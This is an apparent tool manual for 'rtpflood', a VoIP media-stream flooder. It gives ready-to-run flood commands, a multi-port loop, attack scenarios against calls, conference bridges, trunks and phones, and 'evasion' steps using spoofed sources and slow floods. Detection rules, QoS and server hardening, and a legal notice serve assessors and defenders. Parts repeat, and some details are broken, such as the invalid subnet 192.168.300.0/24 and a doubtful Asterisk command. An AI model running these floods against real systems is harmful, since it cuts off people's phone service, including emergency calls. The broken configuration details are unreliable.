# RTP Flood - Real-Time Transport Protocol Flooding Tool

## Overview

RTP Flood is a tool designed to disrupt VoIP (Voice over IP) communications by flooding Real-Time Transport Protocol (RTP) streams with malicious packets. Unlike SIP flooding which targets the signaling protocol, RTP flooding targets the actual media stream, directly impacting voice quality and call availability.

**Category**: Impact / VoIP Attack
**Target Protocol**: RTP (Real-Time Transport Protocol)
**Attack Vector**: UDP-based media stream flooding

### How RTP Works

RTP is the protocol used to transmit audio and video in VoIP calls:

```
Phone A                                    Phone B
  |                                         |
  |======= RTP Stream (Audio/Video) =======>|
  |<====== RTP Stream (Audio/Video) =======|
  |                                         |
  |======= RTCP (Control) =================>|
  |<====== RTCP (Control) =================|
  |                                         |
```

### RTP Packet Structure

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|V=2|P|X|  CC   |M|     PT      |       Sequence Number         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           Timestamp                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             SSRC                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### The RTP Flood Attack

RTP flooding exploits the real-time nature of media streams:

1. **Identifies active RTP streams** (typically UDP ports 10000-20000)
2. **Generates high-volume UDP traffic** to these ports
3. **Overwhelms network bandwidth** dedicated to voice
4. **Degrades call quality** (jitter, packet loss, latency)
5. **Can crash VoIP endpoints** with malformed packets
6. **Disrupts media processing** on servers

### Attack Characteristics

| Aspect | Description |
|--------|-------------|
| Protocol | UDP (typically) |
| Target Ports | 10000-20000 (dynamic) |
| Bandwidth Impact | High |
| Detection Difficulty | Medium |
| Collateral Damage | Can affect other UDP services |

## Installation

### Kali Linux

```bash
sudo apt update
sudo apt install rtpflood
```

### Dependencies

- libc6
- libnet9

### Manual Installation

```bash
git clone https://gitlab.com/kalilinux/packages/rtpflood.git
cd rtpflood
make
sudo ./rtpflood
```

## Usage

### Basic Syntax

```bash
rtpflood [options] <target_ip> <target_port>
```

### Command-Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `-i` | Source IP address | Interface IP |
| `-s` | Source port | Random |
| `-l` | Packet length | 160 bytes |
| `-c` | Packet count | Unlimited |
| `-d` | Delay between packets | 0 |
| `-t` | TOS (Type of Service) | 0 |
| `-v` | Verbose mode | OFF |
| `-h` | Help | - |

### Basic Attack

```bash
# Flood a specific RTP port
sudo rtpflood 192.168.1.100 10000

# Flood with custom packet size
sudo rtpflood -l 320 192.168.1.100 10000

# Flood with packet count limit
sudo rtpflood -c 10000 192.168.1.100 10000
```

### Advanced Usage

```bash
# Spoofed source IP
sudo rtpflood -i 10.0.0.100 192.168.1.100 10000

# Custom source port
sudo rtpflood -s 5004 192.168.1.100 10000

# With delay (slow flood)
sudo rtpflood -d 1000 192.168.1.100 10000

# Custom TOS for QoS marking
sudo rtpflood -t 184 192.168.1.100 10000

# Verbose output
sudo rtpflood -v 192.168.1.100 10000
```

### Port Range Attack

```bash
# Flood multiple RTP ports (script)
for port in $(seq 10000 10050); do
    sudo rtpflood 192.168.1.100 $port &
done
```

## Attack Scenarios

### Scenario 1: Single Call Disruption

**Objective**: Disrupt a specific VoIP call

```bash
# Identify RTP stream
tcpdump -i eth0 -n udp portrange 10000-20000 -c 10

# Flood identified port
sudo rtpflood 192.168.1.100 10000
```

### Scenario 2: Conference Bridge Attack

**Objective**: Disrupt conference bridge media

```bash
# Find conference RTP ports
asterisk -rx "core show channels" | grep RTP

# Flood conference ports
sudo rtpflood 192.168.1.200 10001
sudo rtpflood 192.168.1.200 10002
```

### Scenario 3: Trunk Media Disruption

**Objective**: Disrupt SIP trunk media streams

```bash
# Identify trunk media ports
tcpdump -i eth0 -n host 203.0.113.10 and udp portrange 10000-20000

# Flood trunk media
sudo rtpflood 203.0.113.10 10000
```

### Scenario 4: Endpoint Flooding

**Objective**: Overwhelm IP phone media processing

```bash
# Flood phone's RTP port
sudo rtpflood 192.168.1.50 10000
```

## Evasion Techniques

### Source IP Spoofing

```bash
# Spoof as internal phone
sudo rtpflood -i 192.168.1.1 192.168.1.100 10000

# Spoof as gateway
sudo rtpflood -i 192.168.1.254 192.168.1.100 10000
```

### Timing Manipulation

```bash
# Slow flood to avoid detection
sudo rtpflood -d 5000 192.168.1.100 10000

# Very slow (stealthy)
sudo rtpflood -d 10000 192.168.1.100 10000
```

### TOS Manipulation

```bash
# Mark as high priority (EF DSCP)
sudo rtpflood -t 184 192.168.1.100 10000

# Mark as best effort
sudo rtpflood -t 0 192.168.1.100 10000
```

## Detection Methods

### Network Monitoring

```bash
# Monitor RTP traffic
tcpdump -i eth0 -n udp portrange 10000-20000

# Detect high packet rates
tcpdump -i eth0 -n udp port 10000 -c 1000 | wc -l

# Monitor for spoofed sources
tcpdump -i eth0 -n udp portrange 10000-20000 -e | awk '{print $12}' | sort | uniq -c | sort -rn
```

### VoIP Monitoring

```bash
# Asterisk - monitor RTP
asterisk -rx "rtp show stats"

# Check for packet loss
asterisk -rx "core show channel <channel>"

# Monitor call quality
asterisk -rx "manager command skinnysendcallquality"
```

### IDS Signatures

```
# Snort signature for RTP flood
alert udp any any -> any 10000:20000 (
    msg:"RTP flood detected";
    detection_filter:track by_src, count 1000, seconds 1;
    sid:1000001; rev:1;
)
```

## Defense Mechanisms

### Network-Level Protection

**QoS Configuration**:
```cisco
# Cisco switch/router
class-map match-any VOICE-RTP
 match protocol rtp

policy-map VOICE-POLICY
 class VOICE-RTP
  police rate 1000000 burst 100000
   conform-action transmit
   exceed-action drop

interface GigabitEthernet0/1
 service-policy input VOICE-POLICY
```

**iptables**:
```bash
# Rate limit RTP traffic
iptables -A INPUT -p udp --dport 10000:20000 -m limit --limit 1000/s -j ACCEPT
iptables -A INPUT -p udp --dport 10000:20000 -j DROP

# Limit by source
iptables -A INPUT -p udp --dport 10000:20000 -m connlimit --connlimit-above 50 -j DROP
```

### VoIP Server Configuration

**Asterisk**:
```ini
[general]
; RTP port range
rtpstart=10000
rtpend=20000

; RTP timeout
rtptimeout=30

; RTP keepalive
rtpkeepalive=60
```

**FreeSWITCH**:
```xml
<configuration>
  <profiles>
    <param name="rtp-timer-name" value="soft"/>
    <param name="rtp-timeout-sec" value="30"/>
  </profiles>
</configuration>
```

### Infrastructure Defense

1. **VLAN Segmentation**: Separate voice and data traffic
2. **RTP Authentication**: Use SRTP for encrypted media
3. **Media Gateway**: Deploy session border controllers
4. **Network Monitoring**: Implement real-time RTP analysis
5. **QoS Policies**: Prioritize legitimate voice traffic

## Real-World Applications

### Legitimate Testing

1. **VoIP Security Assessments**: Test media stream resilience
2. **QoS Validation**: Verify quality of service under attack
3. **Capacity Planning**: Determine bandwidth requirements
4. **Incident Response**: Test detection capabilities

### Testing Methodology

```
1. Document VoIP infrastructure topology
2. Identify RTP ports and ranges
3. Start with minimal impact test
4. Monitor call quality metrics (MOS, jitter, loss)
5. Document degradation point
6. Implement mitigations
7. Re-test to verify fixes
```

## Output Examples

### Successful Flood

```bash
$ sudo rtpflood 192.168.1.100 10000

RTP Flood - Sending packets to 192.168.1.100:10000
Packets sent: 10000
Duration: 10.23 seconds
Average rate: 977 packets/sec
```

### Verbose Output

```bash
$ sudo rtpflood -v 192.168.1.100 10000

RTP Flood - Sending packets to 192.168.1.100:10000
Source: 192.168.1.202:5004
Packet size: 160 bytes
Packet 1: 192.168.1.202:5004 -> 192.168.1.100:10000
Packet 2: 192.168.1.202:5004 -> 192.168.1.100:10000
...
```

## Impact Assessment

### Voice Quality Metrics

| Metric | Normal | Under Attack |
|--------|--------|--------------|
| MOS | 4.0+ | 1.0-2.0 |
| Jitter | <30ms | >100ms |
| Packet Loss | <1% | >10% |
| Latency | <150ms | >500ms |

### Network Impact

| Metric | Description |
|--------|-------------|
| Bandwidth | Can consume significant bandwidth |
| CPU | High CPU usage on endpoints |
| Memory | Buffer overflows possible |
| Calls | Complete call disruption |

## System Requirements

### Minimum Requirements

```
- OS: Linux
- Libraries: libnet9
- Network: 10 Mbps
- Privileges: Root (raw sockets)
```

### Recommended Setup

```
- OS: Kali Linux
- RAM: 256MB
- Network: 100 Mbps+
- NIC: Promiscuous mode capable
```

## RTP Protocol Deep Dive

### RTP Packet Structure

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|V=2|P|X|  CC   |M|     PT      |       Sequence Number         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           Timestamp                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             SSRC                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### RTP Header Fields

| Field | Bits | Description |
|-------|------|-------------|
| V | 2 | Version (always 2) |
| P | 1 | Padding flag |
| X | 1 | Extension flag |
| CC | 4 | CSRC count |
| M | 1 | Marker bit |
| PT | 7 | Payload type |
| Sequence | 16 | Packet sequence number |
| Timestamp | 32 | Sampling timestamp |
| SSRC | 32 | Synchronization source |

### Common RTP Payload Types

| PT | Codec | Clock Rate | Description |
|----|-------|------------|-------------|
| 0 | PCMU | 8000 | G.711 mu-law |
| 8 | PCMA | 8000 | G.711 A-law |
| 9 | G722 | 8000 | G.722 wideband |
| 18 | G729 | 8000 | G.729 compression |
| 34 | H263 | 90000 | H.263 video |
| 96 | dynamic | - | Dynamic payload |

### RTCP Packet Types

| Type | Name | Description |
|------|------|-------------|
| 200 | SR | Sender Report |
| 201 | RR | Receiver Report |
| 202 | SDES | Source Description |
| 203 | BYE | End of Session |
| 204 | APP | Application-Defined |

## Attack Analysis

### Bandwidth Consumption

| Codec | Bitrate | Packets/sec | Bandwidth |
|-------|---------|-------------|-----------|
| PCMU | 64 kbps | 50 | 64 kbps |
| G.729 | 8 kbps | 50 | 8 kbps |
| G.722 | 64 kbps | 50 | 64 kbps |

### Impact on Call Quality

| Metric | Normal | Under Attack |
|--------|--------|--------------|
| MOS | 4.0+ | 1.0-2.0 |
| Jitter | <30ms | >100ms |
| Packet Loss | <1% | >10% |
| Latency | <150ms | >500ms |

### Detection Difficulty

| Attack Pattern | Detection |
|----------------|-----------|
| Single port flood | Medium |
| Multi-port flood | Hard |
| Distributed flood | Very Hard |
| Spoofed sources | Hard |

## Defense Architecture

### QoS Configuration

**Cisco IOS**:
```cisco
! Classify RTP traffic
class-map match-any VOICE-RTP
 match protocol rtp audio
 match protocol rtp video

! Apply policing
policy-map VOICE-POLICY
 class VOICE-RTP
  police rate 1000000 burst 100000
   conform-action transmit
   exceed-action drop

! Apply to interface
interface GigabitEthernet0/1
 service-policy input VOICE-POLICY
```

**Linux tc**:
```bash
# Create traffic control rules
tc qdisc add dev eth0 root handle 1: htb default 30
tc class add dev eth0 parent 1: classid 1:1 htb rate 1000mbit
tc class add dev eth0 parent 1:1 classid 1:10 htb rate 100mbit ceil 100mbit
tc filter add dev eth0 protocol ip parent 1:0 prio 1 u32 match ip dport 10000 0xfffe flowid 1:10
```

### VoIP Server Configuration

**Asterisk**:
```ini
[general]
rtpstart=10000
rtpend=20000
rtptimeout=30
rtpkeepalive=60
icesupport=yes
```

**FreeSWITCH**:
```xml
<configuration>
  <profiles>
    <param name="rtp-timer-name" value="soft"/>
    <param name="rtp-timeout-sec" value="30"/>
    <param name="rtp-autoflush" value="true"/>
    <param name="apply-candidate-acl" value="rfc1918.auto"/>
  </profiles>
</configuration>
```

### Network Segmentation

```
# VLAN segmentation for voice traffic
Voice VLAN: 100 (192.168.100.0/24)
Data VLAN: 200 (192.168.200.0/24)
Management VLAN: 300 (192.168.300.0/24)
```

## Integration with Other Tools

### Pre-Attack Reconnaissance

```bash
# Identify active RTP streams
tcpdump -i eth0 -n udp portrange 10000-20000 -c 100

# Monitor VoIP traffic
ngrep -W byline -d eth0 port 10000-20000

# Check VoIP server status
asterisk -rx "rtp show stats"
```

### Post-Attack Analysis

```bash
# Monitor call quality
asterisk -rx "core show channel <channel>"

# Check RTP statistics
asterisk -rx "rtp show stats"

# Review server logs
tail -f /var/log/asterisk/full
```

## Real-World Case Studies

### Case Study 1: Conference Bridge DoS

**Scenario**: Testing conference bridge resilience

```bash
# Find conference RTP ports
tcpdump -i eth0 -n udp portrange 10000-20000

# Flood conference ports
sudo rtpflood 192.168.1.200 10001
sudo rtpflood 192.168.1.200 10002

# Results: Conference audio degraded
# Impact: All participants experienced poor quality
```

**Findings**: No QoS protection on voice VLAN. Recommended:
- Implement QoS policies
- Deploy traffic policing
- Use SRTP for encryption

### Case Study 2: SIP Trunk Media Disruption

**Scenario**: Testing SIP trunk resilience

```bash
# Identify trunk media ports
tcpdump -i eth0 -n host 203.0.113.10 and udp portrange 10000-20000

# Flood trunk media
sudo rtpflood 203.0.113.10 10000

# Results: Trunk calls failed
# Impact: All outbound calls affected
```

**Findings**: No bandwidth limiting on trunk. Recommended:
- Implement bandwidth limits
- Deploy media gateway
- Use encryption (SRTP)

## Best Practices

### Testing Checklist

- [ ] Document VoIP infrastructure
- [ ] Identify RTP ports and ranges
- [ ] Obtain written authorization
- [ ] Notify VoIP operations
- [ ] Start with minimal impact
- [ ] Monitor call quality metrics
- [ ] Document all findings
- [ ] Generate comprehensive report

### Reporting Metrics

1. **Time to Degradation**: How long until call quality drops
2. **Bandwidth Impact**: Amount of bandwidth consumed
3. **Call Quality Impact**: MOS score degradation
4. **Recovery Time**: How long to restore normal operations
5. **Detection Capability**: Was attack detected?

## Limitations

- Requires root/sudo privileges
- Needs knowledge of RTP port ranges
- Effectiveness depends on network QoS
- SRTP (encrypted RTP) may limit impact
- Modern VoIP systems may have better resilience
- Cannot bypass hardware-based QoS
- Single-source attacks may be filtered

## Troubleshooting

### No RTP Traffic Found

```bash
# Monitor for RTP streams
tcpdump -i eth0 -n udp portrange 10000-20000

# Check active calls
asterisk -rx "core show channels"

# Verify RTP ports are in use
netstat -an | grep -E "1[0-9]{4}"
```

### Permission Denied

```bash
# Run as root
sudo rtpflood 192.168.1.100 10000

# Check capabilities
sudo setcap cap_net_raw+ep /usr/bin/rtpflood
```

### Low Packet Rate

```bash
# Check network interface
ifconfig eth0

# Increase buffer sizes
sysctl -w net.core.wmem_max=16777216

# Verify network speed
ethtool eth0
```

## Legal Notice

RTP Flood is a legitimate security testing tool designed to verify VoIP infrastructure resilience. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. This tool should only be used in controlled testing environments with proper authorization.

**Before Testing**:
- Obtain written authorization
- Define scope and targets
- Document test plan
- Notify VoIP operations
- Have rollback procedures

**During Testing**:
- Monitor call quality
- Be ready to stop immediately
- Document all observations
- Avoid affecting emergency services

**After Testing**:
- Restore normal operations
- Document all findings
- Generate comprehensive report
- Recommend improvements

## References

- RFC 3550 - RTP: A Transport Protocol for Real-Time Applications
- RFC 3711 - The Secure Real-time Transport Protocol (SRTP)
- RFC 4585 - Extended RTP Profile for RTCP-Based Feedback
- VoIP Security Best Practices
- RTP Flood Attack Research
- IEEE 802.1Q VLAN Tagging
